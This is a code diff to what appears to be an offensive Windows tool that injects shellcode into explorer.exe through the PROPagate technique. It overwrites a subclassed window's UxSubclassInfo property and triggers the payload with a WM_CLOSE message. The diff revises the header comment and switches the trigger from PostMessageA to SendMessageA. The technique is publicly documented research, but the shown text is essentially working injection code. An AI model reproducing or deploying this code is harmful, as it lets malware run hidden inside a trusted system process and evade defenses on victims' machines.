@@ -1,7 +1,9 @@
 /**
-* Injects shellcode into explorer.exe abusing a subclassed window 
-* [Warning] - The current implementation causes the process crash after executing the shellcode.
+* Injects shellcode into explorer.exe abusing a subclassed window.
 * Supports 32- and 64 Bit applications.
+* [Warning] - The current implementation causes the process crash after executing the shellcode.
+* [Requirements]
+*	- target process must have a subclassed window
 * Based on: https://modexp.wordpress.com/2018/08/23/process-injection-propagate/
 */
 
@@ -149,16 +151,9 @@ bool Propagate(LPVOID payload, DWORD payloadSize)
 
 	printf("[Info] - Updated UxSubclassInfo to new subclass header\n");
 
-	if (!PostMessageA(shellDllDefViewWindowHandle, WM_CLOSE, 0, 0))
-	{
-		printf("[Error] %d - Failed to execute payload using PostMessage\n", GetLastError());
-		return false;
-	}
+	SendMessageA(shellDllDefViewWindowHandle, WM_CLOSE, 0, 0);
 
-	// there is no easy way to wait for PostMessage to be processed so we just wait 1 second
-	Sleep(1000);
-
-	printf("[Info] - Executed payload by posting a WM_CLOSE message to the window\n");
+	printf("[Info] - Executed payload by send a WM_CLOSE message to the window\n");
 
 	if (!SetPropA(shellDllDefViewWindowHandle, "UxSubclassInfo", propHandle))
 	{
